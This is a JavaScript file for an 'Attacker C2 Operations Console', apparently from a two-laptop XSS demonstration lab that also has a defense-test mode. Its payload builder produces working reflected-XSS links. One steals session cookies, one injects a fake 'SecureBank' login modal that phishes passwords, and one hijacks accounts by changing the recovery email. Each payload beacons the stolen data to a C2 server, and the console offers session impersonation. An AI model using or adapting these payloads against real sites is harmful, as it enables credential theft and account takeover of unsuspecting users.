/**
 * Client-Side JavaScript for Attacker C2 Operations Console (Laptop 1)
 */

function getTargetUrl() {
  const el = document.getElementById('input-target');
  if (el && el.value.trim()) return el.value.trim().replace(/\/+$/, '');
  const h = (window.location.hostname === '127.0.0.1') ? '127.0.0.1' : 'localhost';
  return 'http://' + h + ':5000';
}

function getC2Url() {
  const el = document.getElementById('input-c2');
  if (el && el.value.trim()) return el.value.trim().replace(/\/+$/, '');
  const h = (window.location.hostname === '127.0.0.1') ? '127.0.0.1' : 'localhost';
  return 'http://' + h + ':5002';
}

// Construct weaponized payloads safely without breaking HTML parsers
// Uses dual-channel exfiltration: tries C2 directly AND same-origin /log (which syncs to C2 via shared store)
function buildPayload(vectorKey, c2) {
  const openScript = '<' + 'script>';
  const closeScript = '<' + '/script>';

  // Helper: clean single-beacon exfiltration function with sequential fallback (no duplicate requests)
  function exfilCode(dataExpr) {
    return 'function exfil(d){' +
      'var encoded=encodeURIComponent(d);' +
      'var sent=false;' +
      'try{new Image().src="' + c2 + '/log?data="+encoded; sent=true;}catch(e){}' +
      'if(!sent){try{var x=new XMLHttpRequest();x.open("GET","' + c2 + '/log?data="+encoded,true);x.send(); sent=true;}catch(e){}}' +
      'if(!sent){try{fetch("/log?data="+encoded).catch(function(){});}catch(e){}}' +
    '}' +
    'exfil(' + dataExpr + ');';
  }

  if (vectorKey === 'poc' || vectorKey === 'vector_0') {
    return openScript +
      'alert("🚨 Reflected XSS Triggered!\\n\\nOrigin: " + document.domain + "\\nCookies: " + (document.cookie || "(none)"));' +
      exfilCode('"POC_ALERT_TRIGGERED: " + document.domain') +
      closeScript;
  }

  if (vectorKey === 'vector_a') {
    return openScript +
      '(function(){' +
      'var s = document.cookie || "sessionid=UNAUTHENTICATED_GUEST";' +
      exfilCode('s') +
      'var t = document.createElement("div");' +
      't.style = "position:fixed;bottom:20px;left:20px;padding:12px 18px;background:#b91c1c;color:#fff;border-radius:8px;box-shadow:0 10px 15px rgba(0,0,0,0.3);font-family:sans-serif;font-size:13px;font-weight:600;z-index:999999;";' +
      't.innerHTML = "🚨 [Vector A Triggered] Cookie exfiltrated: " + (document.cookie ? "sessionid=..." : "(empty cookie)");' +
      'document.body.appendChild(t);' +
      'setTimeout(function(){ t.remove(); }, 4000);' +
      '})();' +
      closeScript;
  }

  if (vectorKey === 'vector_b') {
    const modalHtml = '<div id="xss-phish-modal" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(15,23,42,0.85);backdrop-filter:blur(4px);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;">' +
      '<div style="background:#ffffff;border-radius:12px;padding:28px;width:380px;box-shadow:0 20px 25px -5px rgba(0,0,0,0.3);border:1px solid #e2e8f0;">' +
        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">' +
          '<span style="font-size:26px;">🏦</span>' +
          '<div><h3 style="margin:0;font-size:16px;font-weight:700;color:#0f172a;">SecureBank Security Check</h3><span style="font-size:12px;color:#dc2626;font-weight:600;">⚠️ Session Expired</span></div>' +
        '</div>' +
        '<p style="font-size:13px;color:#64748b;margin:0 0 16px 0;line-height:1.4;">Your active session has expired for your protection. Please verify your credentials to continue your banking session.</p>' +
        '<form id="xss-phish-form" style="display:flex;flex-direction:column;gap:12px;">' +
          '<div><label style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Username</label><input name="user" type="text" value="victim" required style="width:100%;box-sizing:border-box;padding:8px 12px;border:1px solid #cbd5e1;border-radius:6px;font-size:14px;color:#0f172a;"></div>' +
          '<div><label style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Password</label><input name="pass" type="password" placeholder="Enter bank password" required style="width:100%;box-sizing:border-box;padding:8px 12px;border:1px solid #cbd5e1;border-radius:6px;font-size:14px;color:#0f172a;"></div>' +
          '<button type="submit" id="xss-phish-btn" style="width:100%;padding:10px;background:#b91c1c;color:#ffffff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:4px;">Verify & Continue</button>' +
        '</form>' +
      '</div>' +
    '</div>';

    const modalScript = openScript +
      '(function(){' +
        'var f = document.getElementById("xss-phish-form");' +
        'if (!f) return;' +
        // Embed exfil helper inside the closure
        'function exfil(d){' +
          'var encoded=encodeURIComponent(d);' +
          'var sent=false;' +
          'try{new Image().src="' + c2 + '/log?data="+encoded; sent=true;}catch(e){}' +
          'if(!sent){try{var x=new XMLHttpRequest();x.open("GET","' + c2 + '/log?data="+encoded,true);x.send(); sent=true;}catch(e){}}' +
          'if(!sent){try{fetch("/log?data="+encoded).catch(function(){});}catch(e){}}' +
        '}' +
        'f.addEventListener("submit", function(e){' +
          'e.preventDefault();' +
          'var fd = new FormData(f);' +
          'var c = { user: fd.get("user") || "victim", pass: fd.get("pass") || "secret", time: new Date().toISOString() };' +
          'var d = "PHISH_CREDS:" + JSON.stringify(c);' +
          'exfil(d);' +
          'var m = document.getElementById("xss-phish-modal");' +
          'm.innerHTML = "<div style=\\"background:#fff;padding:24px 32px;border-radius:12px;text-align:center;font-family:sans-serif;box-shadow:0 20px 25px rgba(0,0,0,0.3);\\"><div style=\\"font-size:32px;margin-bottom:8px;\\">✅</div><h3 style=\\"margin:0 0 4px;color:#065f46;\\">Identity Verified</h3><p style=\\"margin:0;font-size:13px;color:#64748b;\\">Restoring banking dashboard...</p></div>";' +
          'setTimeout(function(){ m.remove(); }, 1200);' +
        '});' +
      '})();' +
      closeScript;

    return modalHtml + modalScript;
  }

  if (vectorKey === 'vector_c') {
    return openScript +
      '(function(){' +
        'var em = "attacker-takeover@shadow-c2.com";' +
        // Embed exfil helper
        'function exfil(d){' +
          'var encoded=encodeURIComponent(d);' +
          'var sent=false;' +
          'try{new Image().src="' + c2 + '/log?data="+encoded; sent=true;}catch(e){}' +
          'if(!sent){try{var x=new XMLHttpRequest();x.open("GET","' + c2 + '/log?data="+encoded,true);x.send(); sent=true;}catch(e){}}' +
          'if(!sent){try{fetch("/log?data="+encoded).catch(function(){});}catch(e){}}' +
        '}' +
        'fetch("/settings", {' +
          'method: "POST",' +
          'headers: { "Content-Type": "application/x-www-form-urlencoded" },' +
          'body: "email=" + encodeURIComponent(em)' +
        '}).then(function(){' +
          'var m = "ACTION_EXECUTED: Account recovery email changed to " + em;' +
          'exfil(m);' +
          'var t = document.createElement("div");' +
          't.style = "position:fixed;bottom:20px;right:20px;padding:14px 20px;background:#dc2626;color:#fff;border-radius:8px;box-shadow:0 10px 15px -3px rgba(0,0,0,0.3);font-family:sans-serif;font-size:14px;font-weight:600;z-index:999999;";' +
          't.innerHTML = "🚨 [XSS Attack Executed] Account recovery email hijacked to " + em;' +
          'document.body.appendChild(t);' +
          'setTimeout(function(){ t.remove(); }, 6000);' +
        '});' +
      '})();' +
      closeScript;
  }

  return openScript + 'alert("Reflected XSS Triggered! Origin: " + document.domain);' + closeScript;
}

function getFullUrl(vectorKey, isSecure) {
  let target = getTargetUrl();
  if (isSecure) {
    target = target.replace(':5000', ':5001');
  }
  const c2 = getC2Url();
  const payload = buildPayload(vectorKey, c2);
  return target + '/search?q=' + encodeURIComponent(payload);
}

// Copy to clipboard with multi-environment fallback (handles HTTP on LAN)
function copyText(text, msg) {
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(function() {
      showToast(msg || '📋 Copied to clipboard!');
    }).catch(function() {
      fallbackCopy(text, msg);
    });
  } else {
    fallbackCopy(text, msg);
  }
}

function fallbackCopy(text, msg) {
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.left = '-999999px';
  ta.style.top = '-999999px';
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  try {
    document.execCommand('copy');
    showToast(msg || '📋 Copied to clipboard!');
  } catch (err) {
    prompt('Copy this URL:', text);
  }
  document.body.removeChild(ta);
}

function showToast(msg) {
  let toast = document.getElementById('toast');
  if (!toast) {
    toast = document.createElement('div');
    toast.id = 'toast';
    toast.className = 'toast-popup';
    document.body.appendChild(toast);
  }
  toast.textContent = msg || 'Done';
  toast.style.display = 'block';
  setTimeout(function() {
    toast.style.display = 'none';
  }, 2500);
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function renderEntry(r, target) {
  let badgeClass = 'badge-cyan';
  if (r.category === 'SESSION_COOKIE') badgeClass = 'badge-red';
  else if (r.category === 'CREDENTIALS') badgeClass = 'badge-purple';
  else if (r.category === 'UNAUTHORIZED_ACTION') badgeClass = 'badge-amber';
  else if (r.category === 'POC_ALERT') badgeClass = 'badge-cyan';

  let hijackBtn = '';
  if (r.category === 'SESSION_COOKIE' && r.details && r.details.sessionid) {
    hijackBtn = '<div style="margin-top:0.75rem;">' +
      '<a href="/hijack?sessionid=' + encodeURIComponent(r.details.sessionid) + '&target=' + encodeURIComponent(target) + '" target="_blank" class="btn btn-accent" style="font-size:0.75rem;">' +
        '⚡ Impersonate Victim (Hijack Session on Laptop 1)' +
      '</a>' +
    '</div>';
  }

  let detailsHtml = '';
  if (r.details) {
    const rows = [];
    for (const k in r.details) {
      rows.push('<div class="detail-row"><span class="detail-label">' + escapeHtml(k) + ':</span><span class="detail-val">' + escapeHtml(String(r.details[k])) + '</span></div>');
    }
    detailsHtml = '<div class="log-details-box">' + rows.join('') + '</div>';
  }

  return '<div id="' + escapeHtml(r.id || '') + '" data-log-data="' + escapeHtml(r.data || '') + '" class="log-entry is-new">' +
    '<div class="log-entry-top">' +
      '<span class="badge ' + badgeClass + '">' + escapeHtml(r.category) + '</span>' +
      '<span class="log-time">' + escapeHtml(r.formattedTime || '') + ' &bull; From IP: ' + escapeHtml(r.ip || '127.0.0.1') + '</span>' +
    '</div>' +
    '<div class="log-main">' + escapeHtml(r.summary) + '</div>' +
    detailsHtml +
    hijackBtn +
  '</div>';
}

// Initialize all UI events
function initAttackerUi() {
  // 1. Copy exploit link buttons
  document.querySelectorAll('.copy-exploit-btn').forEach(function(btn) {
    btn.addEventListener('click', function(e) {
      e.preventDefault();
      const v = btn.getAttribute('data-vector');
      const url = getFullUrl(v, false);
      copyText(url, '📋 Malicious link copied! Send this to Laptop 2 (Victim).');
    });
  });

  // 2. Launch exploit buttons
  document.querySelectorAll('.launch-exploit-btn').forEach(function(btn) {
    btn.addEventListener('click', function(e) {
      e.preventDefault();
      const v = btn.getAttribute('data-vector');
      const url = getFullUrl(v, false);
      window.open(url, '_blank');
    });
  });

  // 3. Defense test buttons
  document.querySelectorAll('.launch-defense-btn').forEach(function(btn) {
    btn.addEventListener('click', function(e) {
      e.preventDefault();
      const v = btn.getAttribute('data-vector');
      const url = getFullUrl(v, true);
      window.open(url, '_blank');
    });
  });

  // 4. Update network toolbar button & presets
  const updateNetBtn = document.getElementById('btn-update-net');
  if (updateNetBtn) {
    updateNetBtn.addEventListener('click', function(e) {
      e.preventDefault();
      showToast('🔄 Exploit links updated for target: ' + getTargetUrl());
    });
  }

  const btnLocal = document.getElementById('btn-mode-local');
  const btnLan = document.getElementById('btn-mode-lan');
  const inputTarget = document.getElementById('input-target');
  const inputC2 = document.getElementById('input-c2');
  const netHint = document.getElementById('net-mode-hint');

  if (btnLocal && btnLan && inputTarget && inputC2) {
    btnLocal.addEventListener('click', function(e) {
      e.preventDefault();
      const host = (window.location.hostname === '127.0.0.1') ? '127.0.0.1' : 'localhost';
      inputTarget.value = 'http://' + host + ':5000';
      inputC2.value = 'http://' + host + ':5002';
      btnLocal.className = 'btn btn-accent';
      btnLan.className = 'btn btn-outline';
      if (netHint) netHint.textContent = '(Active Mode: 1-Laptop Localhost — links point to ' + host + ':5000)';
      showToast('💻 Switched to 1-Laptop (Localhost) mode');
    });

    btnLan.addEventListener('click', function(e) {
      e.preventDefault();
      const lanIp = btnLan.getAttribute('data-lan-ip') || '127.0.0.1';
      inputTarget.value = 'http://' + lanIp + ':5000';
      inputC2.value = 'http://' + lanIp + ':5002';
      btnLan.className = 'btn btn-accent';
      btnLocal.className = 'btn btn-outline';
      if (netHint) netHint.textContent = '(Active Mode: 2-Laptops LAN — links point to ' + lanIp + ':5000)';
      showToast('🌐 Switched to 2-Laptop (LAN: ' + lanIp + ') mode');
    });

    // Auto-detect if browser loaded localhost but input has LAN IP (or vice-versa)
    const curHost = window.location.hostname;
    if ((curHost === 'localhost' || curHost === '127.0.0.1') && !inputTarget.value.includes(curHost)) {
      inputTarget.value = 'http://' + curHost + ':5000';
      inputC2.value = 'http://' + curHost + ':5002';
      btnLocal.className = 'btn btn-accent';
      btnLan.className = 'btn btn-outline';
      if (netHint) netHint.textContent = '(Active Mode: 1-Laptop Localhost — links point to ' + curHost + ':5000)';
    }
  }

  // 5. Clear feed button
  const clearBtn = document.getElementById('btn-clear');
  if (clearBtn) {
    clearBtn.addEventListener('click', function(e) {
      e.preventDefault();
      fetch('/api/clear', { method: 'POST' }).then(function() {
        const listEl = document.getElementById('log-list');
        const countEl = document.getElementById('log-count');
        if (listEl) listEl.innerHTML = '<div class="empty-logs">📡 Listening for victim exfiltrations on 0.0.0.0:5002/log...</div>';
        if (countEl) countEl.innerText = '0';
        showToast('🧹 Evidence feed cleared');
      });
    });
  }

  // 6. Connect Real-time SSE Stream
  initSSE();
}

function initSSE() {
  const statusEl = document.getElementById('sse-status');
  const listEl = document.getElementById('log-list');
  const countEl = document.getElementById('log-count');

  if (!window.EventSource) return;

  const es = new EventSource('/events');

  es.onopen = function() {
    if (statusEl) {
      statusEl.textContent = 'LIVE LISTENER ACTIVE';
      statusEl.style.color = '#10b981';
    }
  };

  es.onerror = function() {
    if (statusEl) {
      statusEl.textContent = 'RECONNECTING...';
      statusEl.style.color = '#f59e0b';
    }
  };

  es.onmessage = function(e) {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'LOG') {
        const rec = msg.record;
        if (!rec || !rec.id) return;

        // Prevent duplicate DOM insertions
        if (document.getElementById(rec.id)) return;
        const newest = listEl ? listEl.querySelector('.log-entry') : null;
        if (newest && newest.getAttribute('data-log-data') === rec.data) {
          return; // identical payload already rendered at top
        }

        showToast('🚨 EXFILTRATION ARRIVED: ' + rec.category);
        if (listEl) {
          const empty = listEl.querySelector('.empty-logs');
          if (empty) empty.remove();
          const itemHtml = renderEntry(rec, getTargetUrl());
          listEl.insertAdjacentHTML('afterbegin', itemHtml);
        }
        if (countEl) {
          countEl.innerText = (parseInt(countEl.innerText, 10) || 0) + 1;
        }
      } else if (msg.type === 'CLEAR') {
        if (listEl) listEl.innerHTML = '<div class="empty-logs">📡 Listening for victim exfiltrations on 0.0.0.0:5002/log...</div>';
        if (countEl) countEl.innerText = '0';
      }
    } catch (err) {}
  };
}

// Auto-run when DOM is loaded
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initAttackerUi);
} else {
  initAttackerUi();
}
